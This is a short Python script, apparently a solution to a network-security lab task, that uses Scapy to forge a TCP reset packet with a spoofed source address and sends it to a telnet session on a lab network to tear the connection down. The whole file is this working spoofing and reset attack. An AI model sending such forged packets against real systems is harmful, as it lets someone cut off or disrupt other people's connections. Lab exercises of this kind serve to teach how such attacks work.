#!/usr/bin/env python3

# Task 2.1 ----------------------------------------------------
# Launching the attack manually

from scapy.all import *
from scapy.layers.inet import IP, TCP

ip = IP(src="10.9.0.6", dst="10.9.0.5") #aim to impersonate user so src is user ip
tcp = TCP(sport=36656, dport=23, flags="R", seq=1131601122)
pkt = ip/tcp
ls(pkt)
send(pkt, iface="br-5f9aa6b242e3", verbose=0)
